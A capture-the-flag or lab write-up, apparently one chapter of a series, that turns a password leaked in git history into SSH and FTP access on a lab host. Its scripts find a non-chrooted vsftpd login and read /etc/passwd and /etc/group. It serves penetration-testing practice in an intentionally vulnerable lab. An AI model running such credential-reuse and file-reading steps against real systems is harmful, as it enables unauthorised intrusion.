# 04 — Foothold

Goal: turn two application credentials recovered from git history into a shell on the host, using
the two services already identified — and notice that the FTP account is not confined the way it
looks.

---

## 4.1 SSH first

The commits are authored by `Stuart`, and the first leaked credential is `stuart@challenge.lab`. Try
the local part against the system account:

```bash
sshpass -p 'BreakingBad92' ssh \
  -o PreferredAuthentications=password -o PubkeyAuthentication=no \
  stuart@192.168.161.144 'id; hostname'
```

```
uid=1000(stuart) gid=1000(stuart) groups=1000(stuart),4(adm),24(cdrom),30(dip),46(plugdev)
lab-pwk2-student-cl4-144-ubuntu2204-crystal-240-111
```

In. The database credential is the UNIX credential — the email-shaped username never appears on the
system at all, it was just a login to the `staff` database schema. What mattered was the password.

`stuart` is a **standard user**, not an administrator:

```
4(adm)       read the system logs
24(cdrom)    read /dev/sr0
30(dip)      dial-up group — effectively no extra file access here
46(plugdev)  no extra file access here
```

`adm` is the interesting one: it grants read on `/var/log/` (auth.log, syslog, journal) and, on
Ubuntu, the cloud-init logs. It does not grant write. That is a reconnaissance advantage, not an
escalation.

---

## 4.2 The same password opens FTP

```bash
curl -s -u 'stuart:BreakingBad92' ftp://192.168.161.144/local.txt
```

```
bb8e8b0b546a972d8280c494463cbf93
```

`local.txt` on the first try. But the more important result is what the FTP session's root is.

```bash
python3 - <<'EOF'
import ftplib
f = ftplib.FTP(); f.connect("192.168.161.144", 21, timeout=15)
f.login("stuart", "BreakingBad92")
print("banner :", f.getwelcome())
print("pwd    :", f.pwd())
out = []
f.retrlines("LIST -la", out.append)
print("\n".join(out))
EOF
```

```
banner : 220 (vsFTPd 3.0.5)
pwd    : /
drwxr-xr-x    1 0        0            4096 Nov 18  2022 bin
drwxr-xr-x    1 0        0            4096 Nov 18  2022 boot
drwxr-xr-x    1 0        0            4096 Nov 21 19:04 dev
drwxr-xr-x    1 0        0            4096 Nov 21 19:04 etc
drwxr-xr-x    1 0        0            4096 Nov 18  2022 home
…
```

`pwd` is `/`, and `/` contains `bin`, `boot`, `etc`, `home`, `root`, `var`. This is the **whole
filesystem**, not `stuart`'s home directory.

That is `chroot_local_user=NO`. vsftpd has a secure default (`YES`) precisely because of this; here it
was turned off, presumably so the account could reach a document root somewhere else on disk. The
result is a read-only tour of the box as `stuart`.

Read access follows `stuart`'s own permissions, so `/etc/passwd`, `/etc/group`, `sshd_config` and
anything world-readable is fair game:

```bash
python3 - <<'EOF'
import ftplib, io
f = ftplib.FTP(); f.connect("192.168.161.144", 21, timeout=20)
f.login("stuart", "BreakingBad92")
for p in ["/etc/passwd", "/etc/group"]:
    b = io.BytesIO(); f.retrbinary("RETR " + p, b.write)
    print("=" * 12, p)
    print(b.getvalue().decode()[:900])
EOF
```

```
============ /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
…
stuart:x:1000:1000:Stuart,,,:/home/stuart:/bin/bash
thato:x:1006:1006::/home/thato:/bin/bash
carla:x:1010:1010::/home/carla:/bin/bash
chloe:x:1011:1011::/home/chloe:/bin/bash
dean:x:1012:1012::/home/dean:/bin/bash
ubuntu:x:1013:1013:Ubuntu:/home/ubuntu:/bin/bash
============ /etc/group
adm:x:4:syslog,stuart,ubuntu
cdrom:x:24:stuart,ubuntu
sudo:x:27:chloe,ubuntu
dip:x:30:stuart,ubuntu
plugdev:x:46:stuart,ubuntu
```

Two lines matter for later:

- **`sudo:x:27:chloe,ubuntu`** — the only two accounts with `sudo` are `chloe` and `ubuntu`. Not
  `stuart`. So the escalation target, if it is credential-based, is `chloe`.
- `ubuntu` is the packer's account and is in `sudo` — but its password comes from cloud-init and is
  not readable.

---

## 4.3 What FTP can and cannot do

Writes are refused:

```
200 STOR command okay.
150 Opening BINARY mode data connection.
550 Permission denied.
```

`anon_upload_enable` is irrelevant here; `write_enable=NO` (or a read-only mount) is what applies to
`stuart`. So FTP is a **read-only filesystem browser** — useful, but not a path to code execution.
There is no upload-to-webroot route to chase, and it is worth saying so explicitly rather than
spending an hour hunting for a writable directory.

The one thing worth checking anyway:

```bash
python3 -c "import ftplib;f=ftplib.FTP();f.connect('192.168.161.144');f.login('stuart','BreakingBad92');print(f.pwd())"
```

`/` — already known. A non-writable `chroot` to `/` with these group memberships is the whole story
of the FTP service.

---

## 4.4 A hardening detail that will matter

`sshd_config` is world-readable, and one line in it is not decoration:

```bash
grep -nE 'DenyUsers|AllowUsers|Match' /etc/ssh/sshd_config
```

```
118:#Match User anoncvs
123:DenyUsers chloe
```

**`chloe` cannot log in over SSH at all.** That is a deliberate obstacle, and it has two
implications:

1. Any attempt to check `chloe`'s password over SSH is worthless — `DenyUsers` rejects the session
   *before* authentication, so `Permission denied` is returned whether the password is right or
   wrong. The error is about the user, not the credential.
2. `chloe` must therefore be reachable another way — FTP (`vsftpd` does not consult `DenyUsers`),
   `su` from an existing session, or a local-only file.

That is a clean, deliberate piece of box design. The box is telling us that a credential for `chloe`
exists and that SSH is not how we will use it.

---

## 4.5 State after foothold

| Item | Value |
|---|---|
| Shell | `stuart` (standard user, uid 1000) |
| `local.txt` | `bb8e8b0b546a972d8280c494463cbf93` |
| FTP | `chroot_local_user=NO`, `pwd=/`, **read-only** |
| Groups | `adm`, `cdrom`, `dip`, `plugdev` |
| Cannot read | `/etc/shadow` (mode `640 root:shadow`) |
| Known dead end | `chloe` over SSH — `DenyUsers` |

Now: local enumeration, and the one thing a standard Ubuntu 22.04.1 user can always see — the kernel
version.
